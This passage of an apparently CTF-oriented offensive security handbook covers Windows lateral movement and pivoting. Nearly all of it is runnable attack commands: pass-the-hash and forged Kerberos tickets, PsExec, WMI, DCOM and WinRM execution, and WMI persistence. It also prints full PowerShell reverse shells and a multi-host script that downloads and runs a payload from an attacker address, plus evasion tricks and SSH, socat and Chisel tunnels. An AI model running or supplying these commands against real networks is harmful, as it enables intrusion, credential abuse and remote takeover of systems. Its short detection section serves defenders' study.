+```cmd
+# Mimikatz
+sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:NT_hash /run:powershell.exe
+
+# Rubeus (with AES256 key)
+Rubeus.exe asktgt /user:administrator /aes256:aes_key /nowrap
+
+# With NTLM hash
+Rubeus.exe asktgt /user:administrator /rc4:NT_hash /domain:domain.local /dc:dc01.domain.local /ptt
+```
+
+**Impacket getTGT:**
+
+```bash
+getTGT.py DOMAIN/user -hashes :NT_hash
+getTGT.py DOMAIN/user -aesKey aes256_key
+
+# Use generated ticket
+export KRB5CCNAME=user.ccache
+psexec.py -k -no-pass DOMAIN/user@target.domain.local
+```
+
+### Golden Ticket Attack
+
+Creating forged TGT with KRBTGT hash:
+
+```cmd
+# Mimikatz Golden Ticket
+kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_NT_hash /id:500 /ptt
+
+# Rubeus
+Rubeus.exe golden /rc4:KRBTGT_hash /user:administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /nowrap
+```
+
+**Impacket ticketer.py:**
+
+```bash
+ticketer.py -nthash KRBTGT_hash -domain-sid S-1-5-21-DOMAIN-SID -domain domain.local administrator
+
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
+```
+
+### Silver Ticket Attack
+
+Forging service ticket (TGS) with service account hash:
+
+```cmd
+# Mimikatz
+kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /target:server.domain.local /service:cifs /rc4:service_account_hash /ptt
+```
+
+## Remote Service Execution
+
+Executing commands on remote systems using legitimate Windows services and protocols.
+
+### SMB-Based Execution
+
+**PsExec (Sysinternals):**
+
+```cmd
+# Basic execution
+PsExec.exe \\target_ip -u DOMAIN\user -p password cmd.exe
+
+# Interactive session
+PsExec.exe \\target_ip -u user -p password -i cmd.exe
+
+# Copy and execute
+PsExec.exe \\target_ip -u user -p password -c malware.exe
+
+# System context
+PsExec.exe \\target_ip -u user -p password -s cmd.exe
+```
+
+**Impacket PsExec:**
+
+```bash
+# Username/password
+psexec.py DOMAIN/user:password@target_ip
+
+# Pass-the-hash
+psexec.py -hashes :NT_hash DOMAIN/user@target_ip
+
+# Execute single command
+psexec.py DOMAIN/user:password@target_ip 'ipconfig'
+
+# Use service name (less common detection)
+psexec.py -service-name CustomSvc DOMAIN/user:password@target_ip
+```
+
+**SMBExec (no service executable writes):**
+
+```bash
+smbexec.py DOMAIN/user:password@target_ip
+smbexec.py -hashes :NT_hash DOMAIN/user@target_ip
+
+# Specify share
+smbexec.py -share C$ DOMAIN/user:password@target_ip
+```
+
+### Windows Remote Management (WinRM)
+
+**Evil-WinRM:**
+
+```bash
+# Password authentication
+evil-winrm -i target_ip -u username -p password
+
+# Hash authentication
+evil-winrm -i target_ip -u username -H NT_hash
+
+# SSL connection
+evil-winrm -i target_ip -u username -p password -S
+
+# Custom port
+evil-winrm -i target_ip -u username -p password -P 5986
+
+# Upload/download files
+evil-winrm -i target_ip -u username -p password
+*Evil-WinRM* PS> upload /path/local/file C:\path\remote\
+*Evil-WinRM* PS> download C:\path\remote\file /path/local/
+```
+
+**PowerShell Remoting (from Windows):**
+
+```powershell
+# Enable WinRM (if needed locally)
+Enable-PSRemoting -Force
+
+# Create session
+$session = New-PSSession -ComputerName target_ip -Credential (Get-Credential)
+
+# Execute commands
+Invoke-Command -Session $session -ScriptBlock { whoami }
+
+# Interactive session
+Enter-PSSession -ComputerName target_ip -Credential domain\user
+
+# One-liner execution
+Invoke-Command -ComputerName target_ip -Credential $cred -ScriptBlock { Get-Process }
+
+# Execute script
+Invoke-Command -ComputerName target_ip -FilePath C:\script.ps1 -Credential $cred
+```
+
+**WinRS (Windows Remote Shell):**
+
+```cmd
+winrs -r:target_ip -u:DOMAIN\user -p:password whoami
+winrs -r:target_ip -u:user -p:password cmd
+```
+
+### Scheduled Tasks
+
+**Create Remote Scheduled Task:**
+
+```cmd
+# Using schtasks (Windows)
+schtasks /create /s target_ip /u DOMAIN\user /p password /tn "TaskName" /tr "C:\malware.exe" /sc once /st 00:00
+
+# Execute immediately
+schtasks /run /s target_ip /u DOMAIN\user /p password /tn "TaskName"
+
+# Delete task
+schtasks /delete /s target_ip /u DOMAIN\user /p password /tn "TaskName" /f
+```
+
+**Impacket atexec.py:**
+
+```bash
+# Execute via scheduled task
+atexec.py DOMAIN/user:password@target_ip 'whoami'
+atexec.py -hashes :NT_hash DOMAIN/user@target_ip 'ipconfig'
+```
+
+### Service Creation
+
+**Using sc.exe:**
+
+```cmd
+# Create service
+sc \\target_ip create ServiceName binPath= "C:\malware.exe" start= auto
+
+# Start service
+sc \\target_ip start ServiceName
+
+# Stop and delete
+sc \\target_ip stop ServiceName
+sc \\target_ip delete ServiceName
+```
+
+**Remote Registry Manipulation:**
+
+```cmd
+reg add \\target_ip\HKLM\SYSTEM\CurrentControlSet\Services\ServiceName /v ImagePath /t REG_EXPAND_SZ /d "C:\malware.exe" /f
+```
+
+### DCOM Execution
+
+**MMC20.Application:**
+
+```powershell
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target_ip"))
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","")
+```
+
+**ShellWindows:**
+
+```powershell
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target_ip"))
+$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
+```
+
+**ShellBrowserWindow:**
+
+```powershell
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","target_ip"))
+$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
+```
+
+## WMI Remote Execution
+
+Windows Management Instrumentation provides powerful remote execution capabilities through standardized interfaces.
+
+### WMI Command Execution
+
+**WMIC (from Windows):**
+
+```cmd
+# Basic command execution
+wmic /node:target_ip /user:DOMAIN\user /password:password process call create "cmd.exe /c command"
+
+# Interactive process
+wmic /node:target_ip /user:user /password:pass process call create "powershell.exe"
+
+# Multiple targets
+wmic /node:@targets.txt /user:user /password:pass process call create "cmd.exe"
+
+# Query processes
+wmic /node:target_ip /user:user /password:pass process list brief
+
+# Kill process
+wmic /node:target_ip /user:user /password:pass process where "name='malware.exe'" delete
+```
+
+**Impacket wmiexec.py:**
+
+```bash
+# Interactive shell
+wmiexec.py DOMAIN/user:password@target_ip
+wmiexec.py -hashes :NT_hash DOMAIN/user@target_ip
+
+# Kerberos authentication
+wmiexec.py -k -no-pass DOMAIN/user@target.domain.local
+
+# Single command
+wmiexec.py DOMAIN/user:password@target_ip 'whoami'
+
+# Specify namespace
+wmiexec.py -namespace root/cimv2 DOMAIN/user:password@target_ip
+```
+
+**PowerShell WMI:**
+
+```powershell
+# Create credential object
+$cred = Get-Credential DOMAIN\user
+
+# Execute command
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName target_ip -Credential $cred
+
+# Query information
+Get-WmiObject -Class Win32_OperatingSystem -ComputerName target_ip -Credential $cred
+
+# Using CIM (newer)
+$session = New-CimSession -ComputerName target_ip -Credential $cred
+Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}
+```
+
+### WMI Event Subscriptions (Persistence/Lateral Movement)
+
+**Create Permanent Event Subscription:**
+
+```powershell
+# Event filter (trigger)
+$filter = ([wmiclass]"\\target_ip\root\subscription:__EventFilter").CreateInstance()
+$filter.QueryLanguage = "WQL"
+$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+$filter.Name = "SystemFilter"
+$filter.EventNamespace = 'root\cimv2'
+$filter.Put()
+
+# Consumer (action)
+$consumer = ([wmiclass]"\\target_ip\root\subscription:CommandLineEventConsumer").CreateInstance()
+$consumer.Name = "SystemConsumer"
+$consumer.CommandLineTemplate = "cmd.exe /c calc.exe"
+$consumer.Put()
+
+# Binding
+$binding = ([wmiclass]"\\target_ip\root\subscription:__FilterToConsumerBinding").CreateInstance()
+$binding.Filter = $filter.__PATH
+$binding.Consumer = $consumer.__PATH
+$binding.Put()
+```
+
+**Enumerate WMI Subscriptions:**
+
+```powershell
+Get-WmiObject -Namespace root\subscription -Class __EventFilter -ComputerName target_ip
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ComputerName target_ip
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ComputerName target_ip
+```
+
+**Remove Subscriptions:**
+
+```powershell
+$filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemFilter'" -ComputerName target_ip
+$consumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='SystemConsumer'" -ComputerName target_ip
+$binding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%SystemFilter%'" -ComputerName target_ip
+
+$binding.Delete()
+$consumer.Delete()
+$filter.Delete()
+```
+
+### WMI Lateral Movement with CrackMapExec
+
+```bash
+# Authenticate and execute
+crackmapexec wmi 192.168.1.0/24 -u user -p password -x 'whoami'
+
+# With hash
+crackmapexec wmi 192.168.1.10 -u administrator -H NT_hash -x 'ipconfig'
+
+# Execute PowerShell
+crackmapexec wmi 192.168.1.10 -u user -p password -X '$PSVersionTable'
+
+# Multiple targets from file
+crackmapexec wmi targets.txt -u user -p password -x 'whoami'
+```
+
+### WMI Operational Considerations
+
+[Inference] WMI execution leaves artifacts in `Microsoft-Windows-WMI-Activity/Operational` logs (Event ID 5857-5861). WMIExec creates semi-interactive shells through output retrieval via SMB shares.
+
+**Advantages:**
+
+- No service executable written to disk (stealthier than PsExec)
+- Leverages legitimate Windows functionality
+- Works through firewalls allowing WMI (port 135 + dynamic RPC)
+
+**Requirements:**
+
+- Port 135 (RPC) and dynamic RPC ports (typically 49152-65535)
+- Administrator privileges on target
+- WMI service running (default)
+
+### Tool Comparison Summary
+
+|Tool|Writes to Disk|Network Ports|Stealth Level|Authentication|
+|---|---|---|---|---|
+|PsExec|Yes (service .exe)|445 (SMB)|Low|NTLM, Kerberos|
+|SMBExec|Minimal (batch commands)|445 (SMB)|Medium|NTLM, Kerberos|
+|WMIExec|No|135 + RPC|High|NTLM, Kerberos|
+|Evil-WinRM|No|5985/5986|Medium|NTLM, Kerberos|
+|DCOM|No|135 + RPC|High|NTLM|
+
+---
+
+**Related Topics:**
+
+- **Credential Harvesting:** Extracting additional credentials from compromised systems (LSASS dumping, DPAPI, credential vaults)
+- **Active Directory Enumeration:** BloodHound, PowerView for mapping lateral movement paths
+- **Pivoting and Tunneling:** SSH tunneling, SOCKS proxies (Chisel, ligolo-ng) for network pivoting
+- **Kerberoasting/AS-REP Roasting:** Obtaining service account credentials for lateral movement
+- **Privilege Escalation:** Combining with token impersonation, UAC bypass for higher-level access
+
+---
+
+## DCOM Exploitation
+
+Distributed Component Object Model (DCOM) allows inter-process communication across networked Windows systems. Various DCOM applications can be abused for remote code execution with valid credentials.
+
+### DCOM Architecture Overview
+
+DCOM uses RPC (Remote Procedure Call) over TCP port 135 for initial endpoint resolution, then dynamically assigned high ports (49152-65535) for actual communication. Authentication typically uses current user context or specified credentials.
+
+### Enumeration Techniques
+
+**List DCOM applications:**
+
+```powershell
+# Local DCOM applications
+Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name
+
+# More detailed enumeration
+Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -ErrorAction SilentlyContinue | Select-Object Name
+```
+
+**Enumerate remote DCOM permissions:**
+
+```powershell
+$computer = "TARGET_HOST"
+Get-CimInstance -ComputerName $computer -ClassName Win32_DCOMApplicationSetting | 
+    Select-Object Caption, Description, AppID
+```
+
+**Registry-based enumeration:**
+
+```cmd
+reg query HKLM\SOFTWARE\Classes\AppID /s
+```
+
+### Common Exploitable DCOM Objects
+
+#### MMC20.Application (CLSID: 49B2791A-B1AE-4C90-9B8E-E860BA07F889)
+
+**Exploitation via PowerShell:**
+
+```powershell
+$computer = "192.168.1.100"
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $computer))
+
+# Execute command via ExecuteShellCommand
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
+
+# Reverse shell
+$com.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, "-nop -w hidden -c `$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()", "7")
+```
+
+**Using Impacket's dcomexec.py:**
+
+```bash
+dcomexec.py DOMAIN/user:password@192.168.1.100 "whoami"
+
+# With NTLM hash
+dcomexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c DOMAIN/user@192.168.1.100 "cmd.exe /c command"
+
+# Interactive shell
+dcomexec.py DOMAIN/user:password@192.168.1.100
+```
+
+#### ShellWindows (CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39)
+
+**PowerShell exploitation:**
+
+```powershell
+$computer = "192.168.1.100"
+$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", $computer)
+$obj = [System.Activator]::CreateInstance($com)
+
+# Access Windows Explorer instance
+$item = $obj.Item()
+$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
+```
+
+#### ShellBrowserWindow (CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880)
+
+```powershell
+$computer = "192.168.1.100"
+$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", $computer)
+$obj = [System.Activator]::CreateInstance($com)
+$obj.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\output.txt", "C:\Windows\System32", $null, 0)
+```
+
+#### Excel.Application (Requires Microsoft Office)
+
+```powershell
+$computer = "192.168.1.100"
+$excel = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", $computer))
+
+# Execute macro or DDEInitiate
+$excel.DisplayAlerts = $false
+$excel.DDEInitiate("cmd.exe", "/c calc.exe")
+```
+
+### Scripted DCOM Exploitation
+
+**Automated multi-target script:**
+
+```powershell
+$targets = @("192.168.1.100", "192.168.1.101", "192.168.1.102")
+$command = "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
+
+foreach ($target in $targets) {
+    try {
+        Write-Host "[*] Attempting DCOM execution on $target"
+        $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $target))
+        $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c $command", "7")
+        Write-Host "[+] Success on $target" -ForegroundColor Green
+    }
+    catch {
+        Write-Host "[-] Failed on $target : $_" -ForegroundColor Red
+    }
+}
+```
+
+### Requirements and Constraints
+
+**Network requirements:**
+
+- TCP 135 (RPC Endpoint Mapper) accessible
+- Dynamic RPC ports (49152-65535) accessible
+- Target firewall allows DCOM traffic
+
+**Credential requirements:**
+
+- Valid domain/local administrator credentials
+- Remote access permissions on target system
+- DCOM Launch and Activation permissions
+
+**Check DCOM permissions:**
+
+```powershell
+$acl = Get-Acl "HKLM:\SOFTWARE\Microsoft\Ole"
+$acl.Access | Where-Object {$_.IdentityReference -match "Users"}
+```
+
+### Detection Evasion
+
+**Stealthy execution patterns:**
+
+```powershell
+# Using legitimate binaries for execution
+$com.Document.ActiveView.ExecuteShellCommand("msbuild.exe", $null, "C:\path\to\malicious.xml", "7")
+
+# Living-off-the-land binaries
+$com.Document.ActiveView.ExecuteShellCommand("regsvr32.exe", $null, "/s /n /u /i:http://10.10.14.5/payload.sct scrobj.dll", "7")
+```
+
+## PSExec Usage
+
+PSExec is a Sysinternals tool enabling remote process execution over SMB. It works by copying an executable to the ADMIN$ share, creating a service, starting it, and cleaning up afterward.
+
+### PSExec Mechanics
+
+**Network requirements:**
+
+- SMB (TCP 445) accessible
+- Administrative share access (ADMIN$, IPC$)
+- Local administrator or equivalent credentials
+
+**Authentication flow:**
+
+1. Connect to IPC$ share on target
+2. Connect to ADMIN$ share and copy PSEXESVC.exe
+3. Open Service Control Manager (SCM)
+4. Create and start PSEXESVC service
+5. Execute specified command through named pipe
+6. Clean up service and executable
+
+### Official PSExec (Sysinternals)
+
+**Basic syntax:**
+
+```cmd
+psexec.exe \\TARGET_IP -u DOMAIN\username -p password cmd.exe
+
+# Run command on remote system
+psexec.exe \\192.168.1.100 -u CORP\admin -p P@ssw0rd whoami
+
+# Interactive session
+psexec.exe \\192.168.1.100 -u CORP\admin -p P@ssw0rd cmd
+```
+
+**Common parameters:**
+
+```cmd
+# Run as SYSTEM
+psexec.exe \\192.168.1.100 -u admin -p password -s cmd.exe
+
+# Copy program to execute
+psexec.exe \\192.168.1.100 -u admin -p password -c C:\tools\payload.exe
+
+# Run on multiple computers
+psexec.exe \\192.168.1.100,192.168.1.101,192.168.1.102 -u admin -p password ipconfig
+
+# Run on all computers from file
+psexec.exe @computers.txt -u admin -p password "command"
+
+# Accept EULA automatically
+psexec.exe \\192.168.1.100 -u admin -p password -accepteula cmd
+
+# Run with different priority
+psexec.exe \\192.168.1.100 -u admin -p password -low cmd.exe
+
+# Timeout specification
+psexec.exe \\192.168.1.100 -u admin -p password -n 30 long_running_command.exe
+```
+
+**Interactive reverse shell deployment:**
+
+```cmd
+# On attacker machine, set up listener
+nc -nvlp 4444
+
+# Execute via PSExec
+psexec.exe \\192.168.1.100 -u admin -p password cmd /c "powershell -nop -c $client=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+### Impacket's psexec.py
+
+**Basic usage:**
+
+```bash
+# Standard authentication
+psexec.py DOMAIN/user:password@192.168.1.100
+
+# NTLM hash authentication (Pass-the-Hash)
+psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c DOMAIN/user@192.168.1.100
+
+# Execute single command
+psexec.py DOMAIN/user:password@192.168.1.100 "whoami"
+
+# Using Kerberos authentication
+psexec.py -k -no-pass DOMAIN/user@target.domain.local
+
+# Specify target port
+psexec.py DOMAIN/user:password@192.168.1.100 -port 445
+```
+
+**Advanced options:**
+
+```bash
+# Use specific share (default is ADMIN$)
+psexec.py -share C$ DOMAIN/user:password@192.168.1.100
+
+# Upload and execute file
+psexec.py DOMAIN/user:password@192.168.1.100 -file payload.exe
+
+# Execute without writing to disk (Inference: based on common Impacket patterns)
+psexec.py -no-output DOMAIN/user:password@192.168.1.100 "command"
+
+# Specify service name
+psexec.py -service-name CustomSvc DOMAIN/user:password@192.168.1.100
+```
+
+### Metasploit psexec Module
+
+```bash
+msfconsole
+use exploit/windows/smb/psexec
+
+set RHOSTS 192.168.1.100
+set SMBDomain CORP
+set SMBUser administrator
+set SMBPass P@ssw0rd
+
+# Or use NTLM hash
+set SMBPass 00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.5
+set LPORT 4444
+
+exploit
+```
+
+**Alternative PSExec modules:**
+
+```bash
+# Uses PowerShell for execution
+use exploit/windows/smb/psexec_psh
+
+# Native upload, no service creation
+use exploit/windows/smb/psexec_native_upload
+
+# Command execution only
+use auxiliary/admin/smb/psexec_command
+```
+
+### CrackMapExec Integration
+
+```bash
+# Single target execution
+crackmapexec smb 192.168.1.100 -u admin -p password -x "whoami"
+
+# Execute PowerShell command
+crackmapexec smb 192.168.1.100 -u admin -p password -X '$PSVersionTable'
+
+# Multiple targets from file
+crackmapexec smb targets.txt -u admin -p password -x "ipconfig"
+
+# Pass-the-Hash with command execution
+crackmapexec smb 192.168.1.100 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c -x "whoami"
+
+# Use specific module
+crackmapexec smb 192.168.1.100 -u admin -p password -M mimikatz
+```
+
+### Detection and Prevention
+
+**Windows Event Logs indicating PSExec activity:**
+
+```powershell
+# Service creation (Event ID 7045)
+Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} | 
+    Where-Object {$_.Message -match 'PSEXESVC'}
+
+# Network logon (Event ID 4624, Logon Type 3)
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | 
+    Where-Object {$_.Properties[8].Value -eq 3}
+
+# File creation in ADMIN$ share
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5145} | 
+    Where-Object {$_.Message -match 'ADMIN\$'}
+```
+
+**Registry artifacts:**
+
+```cmd
+reg query HKLM\SYSTEM\CurrentControlSet\Services\PSEXESVC
+```
+
+## SSH Tunneling
+
+SSH tunneling creates encrypted channels for forwarding traffic through SSH connections, enabling access to otherwise unreachable network segments.
+
+### Local Port Forwarding (-L)
+
+Forwards traffic from local machine to remote destination through SSH server.
+
+**Syntax pattern:**
+
+```bash
+ssh -L [local_bind_address:]local_port:destination_host:destination_port user@ssh_server
+```
+
+**Basic local forward:**
+
+```bash
+# Forward local port 8080 to remote service on port 80
+ssh -L 8080:localhost:80 user@ssh-server.com
+
+# Access via: http://localhost:8080
+```
+
+**Forwarding to third-party host:**
+
+```bash
+# Forward local 3306 to MySQL on internal network
+ssh -L 3306:internal-db.corp.local:3306 user@jump-host.com
+
+# Connect to MySQL: mysql -h 127.0.0.1 -P 3306
+```
+
+**Multiple port forwards:**
+
+```bash
+ssh -L 8080:web-server:80 \
+    -L 3306:db-server:3306 \
+    -L 5432:postgres-server:5432 \
+    user@jump-host.com
+```
+
+**Bind to specific interface:**
+
+```bash
+# Listen on all interfaces
+ssh -L 0.0.0.0:8080:target:80 user@ssh-server
+
+# Listen only on localhost (default)
+ssh -L 127.0.0.1:8080:target:80 user@ssh-server
+```
+
+### Remote Port Forwarding (-R)
+
+Forwards traffic from remote machine back to local machine or specified destination.
+
+**Syntax pattern:**
+
+```bash
+ssh -R [remote_bind_address:]remote_port:destination_host:destination_port user@ssh_server
+```
+
+**Basic remote forward:**
+
+```bash
+# Expose local web server to remote network
+ssh -R 8080:localhost:80 user@remote-server.com
+
+# Remote users access via: http://remote-server.com:8080
+```
+
+**Reverse shell enablement:**
+
+```bash
+# Forward remote port to local listener
+ssh -R 4444:localhost:4444 user@attacker-vps.com
+
+# Set up listener locally: nc -lvnp 4444
+# Execute reverse shell on compromised host targeting localhost:4444
+```
+
+**Third-party destination:**
+
+```bash
+# Forward traffic from SSH server to different local network host
+ssh -R 9000:internal-host:80 user@public-server.com
+```
+
+**GatewayPorts for remote binding:**
+
+```bash
+# Allow remote forwarded ports to bind to non-localhost addresses
+# Requires GatewayPorts yes in sshd_config
+
+ssh -R 0.0.0.0:8080:localhost:80 user@server.com
+```
+
+### Dynamic Port Forwarding (-D) - SOCKS Proxy
+
+Creates SOCKS proxy allowing dynamic destination routing through SSH tunnel.
+
+**Basic SOCKS proxy:**
+
+```bash
+# Create SOCKS5 proxy on local port 1080
+ssh -D 1080 user@ssh-server.com
+
+# Configure applications to use SOCKS5 proxy: 127.0.0.1:1080
+```
+
+**Using with proxychains:**
+
+```bash
+# Edit /etc/proxychains4.conf
+# Add: socks5 127.0.0.1 1080
+
+# Establish tunnel
+ssh -D 1080 user@pivot-host.com
+
+# Route traffic through tunnel
+proxychains nmap -sT -Pn 192.168.100.0/24
+proxychains firefox
+proxychains crackmapexec smb 192.168.100.0/24 -u admin -p password
+```
+
+**Specify binding address:**
+
+```bash
+# Bind to all interfaces
+ssh -D 0.0.0.0:1080 user@server.com
+
+# Bind to specific interface
+ssh -D 192.168.1.10:1080 user@server.com
+```
+
+### Combined Tunneling Scenarios
+
+**Pivoting through multiple jump hosts:**
+
+```bash
+# Chain SSH connections
+ssh -L 8080:final-target:80 -J jump-host1,jump-host2 user@final-destination
+
+# Or using ProxyJump in ~/.ssh/config:
+# Host final-destination
+#     ProxyJump jump-host1,jump-host2
+```
+
+**Simultaneous forward types:**
+
+```bash
+ssh -L 8080:web-server:80 \
+    -R 4444:localhost:4444 \
+    -D 1080 \
+    user@pivot-host.com
+```
+
+### SSH Tunnel Options
+
+**Background execution:**
+
+```bash
+# Run in background
+ssh -f -N -L 8080:target:80 user@server.com
+
+# -f : Background mode
+# -N : No command execution
+# -C : Compression
+```
+
+**Keep-alive and timeout:**
+
+```bash
+# Prevent timeout disconnections
+ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -L 8080:target:80 user@server
+
+# ServerAliveInterval: Send keep-alive every 60 seconds
+# ServerAliveCountMax: Disconnect after 3 failed keep-alives
+```
+
+**Using SSH keys:**
+
+```bash
+ssh -i /path/to/private_key -L 8080:target:80 user@server
+```
+
+**Verbose debugging:**
+
+```bash
+ssh -v -L 8080:target:80 user@server      # Basic verbosity
+ssh -vv -L 8080:target:80 user@server     # More detailed
+ssh -vvv -L 8080:target:80 user@server    # Maximum verbosity
+```
+
+### SSH Configuration File
+
+**~/.ssh/config for persistent tunnels:**
+
+```
+Host pivot
+    HostName 192.168.1.100
+    User administrator
+    LocalForward 8080 internal-web:80
+    LocalForward 3306 internal-db:3306
+    DynamicForward 1080
+    ServerAliveInterval 60
+    ServerAliveCountMax 3
+
+# Usage: ssh pivot
+```
+
+### CTF-Specific Tunneling Patterns
+
+**Accessing internal web application:**
+
+```bash
+# Scenario: Web server on 10.10.10.5:80 only accessible from pivot host
+ssh -L 8080:10.10.10.5:80 user@pivot-host.com
+# Browse: http://localhost:8080
+```
+
+**Database port forwarding:**
+
+```bash
+# Access internal MySQL database
+ssh -L 3306:internal-db:3306 user@pivot-host
+mysql -h 127.0.0.1 -P 3306 -u dbuser -p
+```
+
+**Internal network scanning:**
+
+```bash
+# Dynamic tunnel for scanning
+ssh -D 1080 user@pivot-host
+
+# Scan through tunnel
+proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24
+```
+
+## Port Forwarding
+
+Port forwarding enables traffic redirection across network boundaries using various tools and techniques beyond SSH tunneling.
+
+### Netcat Port Forwarding
+
+**Simple relay using named pipes (Linux):**
+
+```bash
+# Forward local port 8080 to remote host:port
+mkfifo backpipe
+nc -l -p 8080 0<backpipe | nc target-host 80 1>backpipe
+
+# Two-way relay through intermediary
+nc -l -p 8080 0<backpipe | nc internal-host 80 | tee backpipe
+```
+
+**Port forwarding without named pipes:**
+
+```bash
+# Using ncat with --sh-exec
+ncat -l -p 8080 --sh-exec "ncat target-host 80"
+
+# Chainable relays
+ncat -l -p 8080 --sh-exec "ncat intermediate 8080" --sh-exec "ncat final-target 80"
+```
+
+### Socat Port Forwarding
+
+**Basic TCP relay:**
+
+```bash
+# Listen on port 8080, forward to target:80
+socat TCP-LISTEN:8080,fork TCP:target-host:80
+
+# fork: Handle multiple connections
+```
+
+**UDP forwarding:**
+
+```bash
+socat UDP-LISTEN:53,fork UDP:dns-server:53
+```
+
+**Bind to specific interface:**
+
+```bash
+socat TCP-LISTEN:8080,bind=192.168.1.10,fork TCP:target:80
+```
+
+**SSL/TLS wrapping:**
+
+```bash
+# Forward with SSL encryption
+socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:internal-web:80
+
+# Connect through SSL
+socat TCP-LISTEN:8080,fork OPENSSL:external-host:443,verify=0
+```
+
+**Reverse shell relay:**
+
+```bash
+# On compromised pivot host
+socat TCP-LISTEN:4444,fork TCP:attacker-ip:4444
+
+# Payload on target connects to pivot:4444, relays to attacker
+```
+
+**PTY shell upgrade through relay:**
+
+```bash
+socat FILE:`tty`,raw,echo=0 TCP:target:4444
+```
+
+### Chisel - HTTP Tunnel
+
+Chisel creates fast TCP/UDP tunnels transported over HTTP and secured via SSH.
+
+**Installation:**
+
+```bash
+# Download from: https://github.com/jpillora/chisel/releases
+
+# Linux
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+chmod +x chisel_1.9.1_linux_amd64
+
+# Windows
+# Download chisel_1.9.1_windows_amd64.gz, extract, execute
+```
+
+**Server mode (on attacker machine):**
+
+```bash
+# Start Chisel server
+./chisel server -p 8000 --reverse
+
+# With authentication
+./chisel server -p 8000 --reverse --auth user:password
+
+# Verbose output
+./chisel server -p 8000 --reverse -v
+```
+
+**Client mode - Remote forward:**
+
+```bash
+# On compromised host - forward remote port to local service
+./chisel client attacker-ip:8000 R:8080:localhost:80
+
+# Multiple forwards
+./chisel client attacker-ip:8000 R:8080:localhost:80 R:3306:db-server:3306
+
+# With authentication
+./chisel client --auth user:password attacker-ip:8000 R:8080:localhost:80
+```
+
+**Client mode - Local forward:**
+
+```bash
+# Forward local port through tunnel to remote destination
